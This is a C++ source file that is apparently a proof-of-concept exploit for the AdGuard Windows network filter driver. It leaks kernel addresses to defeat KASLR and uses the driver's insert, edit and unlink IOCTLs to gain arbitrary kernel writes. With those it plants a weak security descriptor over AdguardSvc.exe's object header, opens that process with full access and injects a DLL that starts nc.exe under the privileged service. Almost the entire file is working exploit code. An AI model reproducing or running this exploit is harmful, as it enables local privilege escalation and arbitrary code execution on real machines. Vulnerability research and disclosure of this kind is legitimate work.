#include <windows.h>
#include <vector>
#include <algorithm>
#include <iostream>
#include <iterator>
#include <set>
#include <tlhelp32.h>

#define MAXIMUM_FILENAME_LENGTH 255 
#define TYPE_INDEX_PROCESS 7

#define ADG_DRIVER_NAME "\\\\.\\CtrlSM_Protected2adgnetworkwfpdrv"
#define IOCTL_ADG_INSERT_ITEM CTL_CODE(0x22, 0x69, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x2201A4
#define IOCTL_ADG_EDIT_ITEM CTL_CODE(0x22, 0x6d, METHOD_BUFFERED, FILE_ANY_ACCESS)   // 0x2201B4
#define IOCTL_ADG_UNLINK CTL_CODE(0x22, 0x6a, METHOD_BUFFERED, FILE_ANY_ACCESS)      // 0x2201A8

HANDLE g_AdgDriverHandle = INVALID_HANDLE_VALUE;
PVOID g_AdgFLT3Pool = NULL;
DWORD g_AdgFLT3ItemCounter = 0;
DWORD g_AdgSvcPID = 0;

BYTE g_FakeKernelStruct[] = {0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Chunk required for not BSODing. May be part of heap manager structs
// Weak Security Descriptor with SACL/DACL NULL
0x01 , 0x00 , 0x00 , 0x88 , 0x6c , 0x00 , 0x00 , 0x00 , 0x7c , 0x00 , 0x00 , 0x00 , 0x14 , 0x00 , 0x00 , 0x00 , 0x30 , 0x00 , 0x00 , 0x00 , 0x02 , 0x00 , 0x1c , 0x00 , 0x01 , 0x00 , 0x00 , 0x00 , 0x11 , 0x00 , 0x14 , 0x00 , 0x03 , 0x00 , 0x00 , 0x00 , 0x01 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x10 , 0x00 , 0x40 , 0x00 , 0x00 , 0x02 , 0x00 , 0x3c , 0x00 , 0x02 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x14 , 0x00 , 0xff , 0xff , 0x1f , 0x00 , 0x01 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x05 , 0x12 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x18 , 0x00 , 0x11 , 0x14 , 0x12 , 0x00 , 0x01 , 0x02 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x05 , 0x20 , 0x00 , 0x00 , 0x00 , 0x20 , 0x02 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x01 , 0x02 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x05 , 0x20 , 0x00 , 0x00 , 0x00 , 0x20 , 0x02 , 0x00 , 0x00 , 0x01 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x05 , 0x12 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00};

struct IOCTL_MSG {
	DWORD index;
	DWORD nextItem;
	DWORD Unknown2;
	DWORD Unknown3;
	DWORD Unknown4;
}; 

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64,
	SystemBigPoolInformation = 0x42
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

//from http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool_entry.htm
typedef struct _SYSTEM_BIGPOOL_ENTRY 
{
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	ULONG_PTR SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

//from http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool.htm
typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;


typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);


/*
Query addresses of kernel EPROCESS structure of all processes in the system.
https://github.com/sam-b/windows_kernel_address_leaks/blob/master/NtQuerySysInfo_SystemHandleInformation/NtQuerySysInfo_SystemHandleInformation/NtQuerySysInfo_SystemHandleInformation.cpp
*/
std::set<PVOID> query_eprocess_set() {
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	std::set<PVOID> eprocess_set;
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress() failed.\n");
		exit(1);
	}
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS) 0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
		exit(1);
	}
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
		if ((DWORD)pid == 4 && pHandleInfo->Handles[i].ObjectTypeIndex == TYPE_INDEX_PROCESS) {
				eprocess_set.insert(object);		
		}
	}
	return eprocess_set;
}

/*
Compare two sets, check that there is only one element in difference and return this element.
We will use this functions to compare two EPROCESSes sets and the difference will be EPROCESS of AdguardSvc.exe
*/
PVOID set_single_difference(std::set<PVOID> s1, std::set<PVOID> s2) {
	std::vector<PVOID> diff;
	std::set_difference(s2.begin(), s2.end(), s1.begin(), s1.end(), std::inserter(diff, diff.begin()));
	if (diff.size() != 1) {
		printf("[-] Can't unambigiosly define difference\n");
		exit(1);
	}
	return diff.at(0);
}
/*
Unprivieged user is able to start "Adguard Service".
*/
void start_adguard_service() {
	printf("[+] Turn on Adguard Service\n");
	int ret = system("sc start \"Adguard Service\" > nul");
	if (ret != 0) {
		printf("[-] Can't start AdguardSvc.exe\n");
		exit(1);
	}
}

/*
Leak kernel address of FLT3 pool
https://github.com/sam-b/windows_kernel_address_leaks/blob/master/NtQuerySysInfo_SystemBigPoolInformation/NtQuerySysInfo_SystemBigPoolInformation/NtQuerySysInfo_SystemBigPoolInformation.cpp
*/
PVOID query_adguard_FLT3_pool() {
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress() failed.\n");
		exit(1);
	}
	unsigned int len = sizeof(SYSTEM_BIGPOOL_INFORMATION);
	unsigned long out;
	PSYSTEM_BIGPOOL_INFORMATION info = NULL;
	NTSTATUS status = ERROR;
	

	do {
		len *= 2;
		info = (PSYSTEM_BIGPOOL_INFORMATION) GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemBigPoolInformation, info, len, &out);
	} while (status == (NTSTATUS)0xc0000004);

	if (!SUCCEEDED(status)) {
		printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
		exit(1);
	}

	DWORD lastFoundFLT3 = 0;
	for (unsigned int i = 0; i < info->Count; i++) {
		SYSTEM_BIGPOOL_ENTRY poolEntry = info->AllocatedInfo[i];
		if (!memcmp(poolEntry.Tag, "FLT3", 4)) {
			lastFoundFLT3 = ((DWORD)poolEntry.VirtualAddress - 1);
		}
	}
	if (lastFoundFLT3 == 0){
		printf("[-] Can't find FLT3 pool kernel address\n");
		exit(1);
	}
	return (PVOID) lastFoundFLT3;
}

void sendIOCTL(DWORD IOCTL, IOCTL_MSG* msg_in, IOCTL_MSG* msg_out) {
	memset(msg_out, 0, sizeof(IOCTL_MSG));
	DWORD bytes;
	if (!::DeviceIoControl(g_AdgDriverHandle, IOCTL, (PVOID)msg_in, sizeof(IOCTL_MSG), PVOID(msg_out), sizeof(IOCTL_MSG), &bytes, nullptr)){
		printf("DeviceIoControl failed: %X\n", GetLastError());
		exit(1);
	}
}

DWORD adg_insert_item(IOCTL_MSG msg_in) {
	IOCTL_MSG msg_out;
	sendIOCTL(IOCTL_ADG_INSERT_ITEM, &msg_in, &msg_out);
	return msg_out.index;
}

void adg_edit_item(DWORD item_index, DWORD new_val) {
	IOCTL_MSG msg_in, msg_out;
	msg_in.index = item_index;
	msg_in.nextItem = new_val;
	sendIOCTL(IOCTL_ADG_EDIT_ITEM, &msg_in, &msg_out);
}

void adg_unlink_item(DWORD item_index) {
	IOCTL_MSG msg_in, msg_out;
	msg_in.index = item_index;
	sendIOCTL(IOCTL_ADG_UNLINK, &msg_in, &msg_out);
}

/*
First primitive. Write continious byte array to the FLT3 pool
*/
PVOID write_to_FLT3(DWORD start_index, BYTE* src, DWORD size) {
	if (size % 4) {
		printf("[-] Byte array must be alligned by 4\n");
		exit(1);
	}

	IOCTL_MSG msg_in;
	memset(&msg_in, 0x31, sizeof(IOCTL_MSG));
	DWORD index = start_index;
	for (int i = 0; i < size; i += sizeof(DWORD)) {
		DWORD new_val = *(DWORD*)((DWORD)src + i);
		adg_edit_item(index, new_val);
		adg_unlink_item(index++);
	}
	return (PVOID) ((DWORD)g_AdgFLT3Pool + sizeof(DWORD) + start_index * sizeof(DWORD));
}

void init_globals() {
	g_AdgDriverHandle = CreateFile(ADG_DRIVER_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (g_AdgDriverHandle == INVALID_HANDLE_VALUE){
		printf("[-] Error opening " ADG_DRIVER_NAME ". Maybe AdguardSvc.exe is running. Try to turn off protection from Adguard UI.");
		exit(1);
	}
	g_AdgFLT3Pool = query_adguard_FLT3_pool();

	// warm up FLT3 pool
	DWORD index;
	do {
		IOCTL_MSG msg;
		memset(&msg, 0x31, sizeof(IOCTL_MSG));
		index = adg_insert_item(msg);
	}while(index != 0xBCB);
}

DWORD adguardsvc_pid() {
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "AdguardSvc.exe") == 0)
            {  
				//printf("[+] AdguardSvc.exe pid %d\n", entry.th32ProcessID);
				return entry.th32ProcessID;
            }
        }
	}
	printf("[-] AdguardSvc.exe not found\n");
	exit(1);
}


int main() {
	init_globals();
	printf("[=====] Stage I. Bypass KASLR\n");
	printf("[+] Query EPROCESSes first time\n");
	std::set<PVOID> firstRun = query_eprocess_set();

	start_adguard_service();
	
	printf("[+] Query EPROCESSes second time\n");
	std::set<PVOID> secondRun = query_eprocess_set();

	PVOID pAdgsvcEprocess = set_single_difference(firstRun, secondRun);
	printf("[+] AdguardSvc.exe EPROCESS kernel address: 0x%p\n", pAdgsvcEprocess);
	printf("[+] FLT3 Paged pool address: 0x%p\n", g_AdgFLT3Pool);
	
	getchar();
	printf("[=====] Stage II. Write Weak Security Descriptor to the FLT3 Paged Pool\n");
	
	
	PVOID dst = write_to_FLT3(0x1f, g_FakeKernelStruct, sizeof(g_FakeKernelStruct)); // Use primitive 1 - write to FLT3 pool
	printf("[+] g_FakeKernelStruct at FLT3: written 0x%X bytes to 0x%08X\n", sizeof(g_FakeKernelStruct), dst);
	DWORD pFakeExFastRefSD = ((DWORD)dst + 0x10) | 6; // 6 is the random ref count of EX_FAST_REF
	printf("[+] pFakeExFastRefSD = 0x%08X\n",pFakeExFastRefSD);



	g_AdgSvcPID = adguardsvc_pid();
	
	PVOID pHandleCount = (PVOID) ((DWORD)pAdgsvcEprocess - 0x18 /*size OBJECT_HEADER*/ + 4 /*offset HandleCount*/);
	printf("[=====] Stage III. Edit AdguardSvc.exe OBJECT_HEADER.SecurityDescriptor\n");

	printf("[+] AdguardSvc.exe OBJECT_HEADER.HandleCount = 0x%p\n", pHandleCount);
	IOCTL_MSG msg_in, msg_out;
	msg_in.index = 6;
	msg_in.nextItem = (DWORD) pHandleCount; //Driver will interpret this value as address later
	sendIOCTL(IOCTL_ADG_EDIT_ITEM, &msg_in, &msg_out); // edit this item
	sendIOCTL(IOCTL_ADG_UNLINK, &msg_in, &msg_out);  


	printf("[=====] Stage IV. Bruteforce OBJECT_HEADER.TypeIndex\n");
	HANDLE hAdgSvc = 0;
	BYTE typeIndex = 0;
	while (true){
		IOCTL_MSG patch;
		patch.index = 6; // Predictable DWORD
		patch.nextItem = 0x00880000 | typeIndex; // Flags constant + typeIndex
		patch.Unknown2 = 0x00000000; // ObjectCreateInfo = NULL
		patch.Unknown3 = pFakeExFastRefSD; // EX_FAST_REF pointer to the weak Security Descriptor at FLT3 pool
		patch.Unknown4 = 0x00000003; // EPROCESS.HEADER.LOCK constant
		sendIOCTL(IOCTL_ADG_EDIT_ITEM, &patch, &msg_out); // Use primitive 2 - arbitrary 16 bytes write to kernel space
		hAdgSvc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, g_AdgSvcPID);
		
		if (hAdgSvc != 0) {
			printf("[+] OBJECT_HEADER.TypeIndex = 0x%02X\n", typeIndex);
			break;
		}
		typeIndex++;
	}
	printf("[+] AdguardSvc.exe opened with PROCESS_ALL_ACCESS, hAdgSvc = 0x%04X\n", hAdgSvc);
	
	printf("[=====] Stage V. Inject into AdguardSvc.exe\n");
		char maliciousDll[] = "C:\\Users\\user\\AppData\\Local\\Temp\\my_tmp\\spawn_nc.dll";

	PVOID pLibRemote = VirtualAllocEx(hAdgSvc, NULL, sizeof(maliciousDll), MEM_COMMIT, PAGE_READWRITE);
	printf("[+] Memory allocated at AdguardSvc.exe: 0x%08X\n", pLibRemote);
	if(!WriteProcessMemory(hAdgSvc, pLibRemote, (PVOID) maliciousDll, sizeof(maliciousDll), NULL)){
		printf("[-] Unable to write to AdguardSvc.exe memory\n");
		exit(1);
	}
	printf("[+] \"%s\" written at address 0x%08X\n", maliciousDll, pLibRemote);

	HANDLE hThread = CreateRemoteThread( hAdgSvc, NULL, 0, (LPTHREAD_START_ROUTINE )GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryA"), pLibRemote, 0, NULL );
	if (hThread == NULL){
		printf("[-] Can't inject into AdguardSvc.exe\n");
		exit(1);
	}
	printf("[+] Remote thread created: hThread = 0x%04X\n", hThread);
	printf("[+] nc.exe started as child process of AdguardSvc.exe\n");

	return 0;
}